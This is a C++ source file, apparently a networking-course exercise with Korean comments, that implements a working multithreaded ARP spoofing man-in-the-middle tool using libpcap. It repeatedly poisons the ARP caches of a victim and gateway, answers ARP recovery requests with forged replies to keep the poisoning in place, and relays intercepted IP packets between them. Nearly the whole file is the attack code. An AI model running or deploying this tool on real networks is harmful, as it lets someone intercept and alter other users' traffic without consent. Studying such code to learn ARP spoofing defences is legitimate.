#include <cstdio>
#include <pcap.h>
#include "custom.h"
#include <iostream>
#include <thread>
#include <vector>

Param param  = {
	.dev_ = NULL
};

void work(Flow *flow){
	printf("%d %s %s %s\n", std::this_thread::get_id(), flow->interface, flow->sender, flow->target);
	//Attacker Ip & Mac 가져오기
    flow->attacker_ip = myIp(flow->interface);
	flow->attacker_mac = myMac(flow->interface);
	printf("attacker_Ip : %s\n", ((std::string)flow->attacker_ip).c_str());
	printf("attacker_Mac : %s\n", ((std::string)flow->attacker_mac).c_str());

	char errbuf[PCAP_ERRBUF_SIZE];	
	
	pcap_t* handle = pcap_open_live(param.dev_, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", param.dev_, errbuf);
		exit(-1);
	}

	// Sender & Target Get IP
	flow->sender_ip = Ip(flow->sender);	 //victim_Mac
	flow->target_ip = Ip(flow->target); //gateway_Mac
	printf("sender_Ip : %s\n", ((std::string)flow->sender_ip).c_str());
	printf("target_Ip : %s\n", ((std::string)flow->target_ip).c_str());
	
	// Sender & Target Get Mac
	Mac boardcast_Mac = Mac::broadcastMac();
	
	// Sender Mac 확인
	sendArp(handle, flow->attacker_ip, flow->sender_ip, flow->attacker_mac, boardcast_Mac, ArpHdr::Request);
	flow->sender_mac = getMac(handle, flow->sender_ip, flow->attacker_ip, flow->attacker_mac);	 			 // victim_Mac
	printf("sender_Mac : %s\n", ((std::string)flow->sender_mac).c_str());

	// target Mac 확인	
	sendArp(handle, flow->attacker_ip, flow->target_ip, flow->attacker_mac, boardcast_Mac, ArpHdr::Request);
	flow->target_mac = getMac(handle, flow->target_ip, flow->attacker_ip, flow->attacker_mac);	 			 // target_Mac
	printf("target_Mac : %s\n", ((std::string)flow->target_mac).c_str());
	
	struct pcap_pkthdr* header;
	const u_char* packet;
	int check = 0;
	int res = 0;
	while (true) {
		// Arp Spoofing Attack 
		if (check % 100 == 0 ){	// (지속적인 변조 시도)
			sendArp(handle, flow->target_ip, flow->sender_ip, flow->attacker_mac, flow->sender_mac, ArpHdr::Request); // sender table 변조
			sendArp(handle, flow->sender_ip, flow->target_ip, flow->attacker_mac, flow->target_mac, ArpHdr::Request); // target table 변조
			printf("Arp Spoofing Attack Success\n");
		}
		check++;
	
		res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}
		
		EthHdr* eth = (EthHdr*)(packet);
		
		if (eth->type() == EthHdr::Arp){ 	//ARP 변조 복구 방지 REPLY 구현
			ArpHdr* arp = (ArpHdr*)(packet+sizeof(EthHdr));

			if (arp->op() != ArpHdr::Request) continue;

			if (eth->dmac() == flow->attacker_mac){
				printf("ARP 변조 복구 방지 REPLY\n");
				Ip sip = arp->tip();
				Ip dip = arp->sip();
				Mac smac = arp->tmac();
				Mac dmac = arp->smac();
				sendArp(handle, sip, dip, smac, dmac, ArpHdr::Reply);
			}
		}else if(eth->type() == EthHdr::Ip4){ 	//REPLY 구현
			IpHdr* ip = (IpHdr*)(packet+sizeof(EthHdr));

			//Request Relay (sender -> attacker, attacker -> target)
			if (eth->dmac() == flow->attacker_mac && ip->sip() == flow->sender_ip){
				printf("%d \t",std::this_thread::get_id());
				printf("Icmp Request Relay (sender -> attacker, attacker -> target)\n");
				eth->setDmac(flow->target_mac);
				eth->setSmac(flow->attacker_mac);

				int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(packet), sizeof(EthHdr)+ip->tl());
				if (res != 0) {
					fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
				}
			}else if (eth->dmac() == flow->attacker_mac && ip->dip() == flow->sender_ip){	//Request Relay (target -> attacker, attacker -> sender)
				printf("%d \t",std::this_thread::get_id());
				printf("Icmp REPLAY Relay (target -> attacker, attacker -> sender)\n");
				eth->setDmac(flow->sender_mac);
				eth->setSmac(flow->attacker_mac);

				int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(packet), sizeof(EthHdr)+ip->tl());
				if (res != 0) {
					fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
				}
			}
		}
	}
	pcap_close(handle);
}

int main(int argc, char* argv[]) {	
	if (!parse(&param, argc, argv))
		return -1;
	
	int count = (int)((argc -2) / 2);
	Flow *flow = (Flow*)malloc(sizeof(Flow)*count);

	for (int i = 0; i < count; i++){
		flow[i].interface = argv[1];
		flow[i].sender = argv[2*(i+1)];
		flow[i].target = argv[2*(i+1)+1];
	}

	std::vector<std::thread> works;

	for (int i = 0; i < count; i++){
		works.push_back(std::thread(work, &flow[i]));
	}

	for (int i = 0; i < count; i++){
		works[i].join();
	}
}
